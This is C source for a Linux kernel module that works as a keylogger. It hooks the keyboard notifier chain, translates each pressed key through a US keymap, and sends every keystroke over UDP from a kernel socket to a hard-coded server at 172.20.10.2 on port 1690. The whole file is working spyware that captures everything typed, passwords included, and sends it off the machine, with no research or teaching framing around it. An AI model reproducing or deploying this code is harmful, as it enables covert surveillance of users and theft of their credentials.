#include "key_logger.h"

#include <linux/inet.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/net.h>
#include <linux/notifier.h>

static struct socket *udp_socket = NULL;

const char *server_ip = "172.20.10.2";
const unsigned short server_port = 1690;

static int create_udp_socket(void) {
  int ret;

  ret = sock_create_kern(&init_net, PF_INET, SOCK_DGRAM, IPPROTO_UDP,
                         &udp_socket);
  if (ret < 0) {
    udp_socket = NULL;
    return ret;
  }

  pr_info("Kernel UDP socket created successfully.\n");
  return 0;
}

static int send_udp_message(const char *ip, unsigned short port,
                            const char *message, size_t message_len) {
  struct sockaddr_in dest_addr;
  struct msghdr msg = {0};
  struct kvec iov;
  int ret;

  if (!udp_socket) {
    pr_info("UDP socket is not initialized.\n");
    return -EINVAL;
  }

  memset(&dest_addr, 0, sizeof(dest_addr));
  dest_addr.sin_family = AF_INET;
  dest_addr.sin_port = htons(port);
  ret = in4_pton(ip, -1, (u8 *)&dest_addr.sin_addr.s_addr, '\0', NULL);

  if (ret == 0) {
    pr_info("Invalid IP address format.\n");
    return -EINVAL;
  }

  iov.iov_base = (char *)message;
  iov.iov_len = message_len;

  msg.msg_name = &dest_addr;
  msg.msg_namelen = sizeof(dest_addr);

  ret = kernel_sendmsg(udp_socket, &msg, &iov, 1, message_len);
  if (ret < 0) {
    pr_info("Failed to send UDP message: %d\n", ret);
  }
  return ret;
}

static void release_socket(void) {
  if (udp_socket) {
    sock_release(udp_socket); // Release the socket
    pr_info("UDP socket released.\n");
  }
}

static const char *us_keymap[][2] = {
    {"\0", "\0"},
    {"_ESC_", "_ESC_"},
    {"1", "!"},
    {"2", "@"}, // 0-3
    {"3", "#"},
    {"4", "$"},
    {"5", "%"},
    {"6", "^"}, // 4-7
    {"7", "&"},
    {"8", "*"},
    {"9", "("},
    {"0", ")"}, // 8-11
    {"-", "_"},
    {"=", "+"},
    {"_BACKSPACE_", "_BACKSPACE_"}, // 12-14
    {"_TAB_", "_TAB_"},
    {"q", "Q"},
    {"w", "W"},
    {"e", "E"},
    {"r", "R"},
    {"t", "T"},
    {"y", "Y"},
    {"u", "U"},
    {"i", "I"}, // 20-23
    {"o", "O"},
    {"p", "P"},
    {"[", "{"},
    {"]", "}"}, // 24-27
    {"\n", "\n"},
    {"_LCTRL_", "_LCTRL_"},
    {"a", "A"},
    {"s", "S"}, // 28-31
    {"d", "D"},
    {"f", "F"},
    {"g", "G"},
    {"h", "H"}, // 32-35
    {"j", "J"},
    {"k", "K"},
    {"l", "L"},
    {";", ":"}, // 36-39
    {"'", "\""},
    {"`", "~"},
    {"_LSHIFT_", "_LSHIFT_"},
    {"\\", "|"}, // 40-43
    {"z", "Z"},
    {"x", "X"},
    {"c", "C"},
    {"v", "V"}, // 44-47
    {"b", "B"},
    {"n", "N"},
    {"m", "M"},
    {",", "<"}, // 48-51
    {".", ">"},
    {"/", "?"},
    {"_RSHIFT_", "_RSHIFT_"},
    {"_PRTSCR_", "_KPD*_"},
    {"_LALT_", "_LALT_"},
    {" ", " "},
    {"_CAPS_", "_CAPS_"},
    {"F1", "F1"},
    {"F2", "F2"},
    {"F3", "F3"},
    {"F4", "F4"},
    {"F5", "F5"}, // 60-63
    {"F6", "F6"},
    {"F7", "F7"},
    {"F8", "F8"},
    {"F9", "F9"}, // 64-67
    {"F10", "F10"},
    {"_NUM_", "_NUM_"},
    {"_SCROLL_", "_SCROLL_"}, // 68-70
    {"_KPD7_", "_HOME_"},
    {"_KPD8_", "_UP_"},
    {"_KPD9_", "_PGUP_"}, // 71-73
    {"-", "-"},
    {"_KPD4_", "_LEFT_"},
    {"_KPD5_", "_KPD5_"}, // 74-76
    {"_KPD6_", "_RIGHT_"},
    {"+", "+"},
    {"_KPD1_", "_END_"}, // 77-79
    {"_KPD2_", "_DOWN_"},
    {"_KPD3_", "_PGDN"},
    {"_KPD0_", "_INS_"}, // 80-82
    {"_KPD._", "_DEL_"},
    {"_SYSRQ_", "_SYSRQ_"},
    {"\0", "\0"}, // 83-85
    {"\0", "\0"},
    {"F11", "F11"},
    {"F12", "F12"},
    {"\0", "\0"}, // 86-89
    {"\0", "\0"},
    {"\0", "\0"},
    {"\0", "\0"},
    {"\0", "\0"},
    {"\0", "\0"},
    {"\0", "\0"},
    {"_KPENTER_", "_KPENTER_"},
    {"_RCTRL_", "_RCTRL_"},
    {"/", "/"},
    {"_PRTSCR_", "_PRTSCR_"},
    {"_RALT_", "_RALT_"},
    {"\0", "\0"}, // 99-101
    {"_HOME_", "_HOME_"},
    {"_UP_", "_UP_"},
    {"_PGUP_", "_PGUP_"}, // 102-104
    {"_LEFT_", "_LEFT_"},
    {"_RIGHT_", "_RIGHT_"},
    {"_END_", "_END_"},
    {"_DOWN_", "_DOWN_"},
    {"_PGDN", "_PGDN"},
    {"_INS_", "_INS_"}, // 108-110
    {"_DEL_", "_DEL_"},
    {"\0", "\0"},
    {"\0", "\0"},
    {"\0", "\0"}, // 111-114
    {"\0", "\0"},
    {"\0", "\0"},
    {"\0", "\0"},
    {"\0", "\0"},           // 115-118
    {"_PAUSE_", "_PAUSE_"}, // 119
};

static const char *keycode_to_us_string(int keycode, int shift) {
  if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
    return (shift == 1) ? us_keymap[keycode][1] : us_keymap[keycode][0];
  }

  return NULL;
}

static int keyboard_callback(struct notifier_block *kblock,
                             unsigned long action, void *data) {
  struct keyboard_notifier_param *key_param =
      (struct keyboard_notifier_param *)data;
  const char *key = keycode_to_us_string(key_param->value, key_param->shift);

  if (key && key_param->down) {
    send_udp_message(server_ip, server_port, key, strlen(key) + 1);
  }

  return NOTIFY_OK;
}

static struct notifier_block nb;

void start_key_logging(void) {
  create_udp_socket();
  nb.notifier_call = &keyboard_callback;
  register_keyboard_notifier(&nb);
}

void stop_key_logging(void) {
  unregister_keyboard_notifier(&nb);
  release_socket();
}
